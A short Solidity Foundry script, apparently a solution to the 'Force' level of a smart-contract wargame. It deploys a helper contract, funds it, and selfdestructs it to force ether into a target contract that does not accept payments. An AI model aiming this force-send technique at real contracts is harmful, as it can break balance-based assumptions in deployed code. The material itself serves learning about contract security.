// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Force} from "../src/Force.sol";

contract ExploitForce is Script {
    address private constant INSTANCE_ADDRESS = 0x56a109180537274E94e61C09bF75f4868573db9B;
    uint256 private immutable PRIVATE_KEY = vm.envUint("PRIVATE_KEY");

    function run() public {
        vm.startBroadcast(PRIVATE_KEY);
        SelflessDestroyer destroy = new SelflessDestroyer();
        // payable(address(destroy)).transfer(1);
        uint256 balance = destroy.giveMeMoney{value: 0.001 ether}();
        console.log(balance);
        if (balance == 0.001 ether) {
            destroy.destroyMe();
        }
        vm.stopBroadcast();
    }
}

contract SelflessDestroyer {
    function giveMeMoney() public payable returns (uint256) {
        return address(this).balance;
    }

    function destroyMe() public {
        address payable INSTANCE_ADDRESS = payable(0x56a109180537274E94e61C09bF75f4868573db9B);
        selfdestruct(INSTANCE_ADDRESS);
    }
}
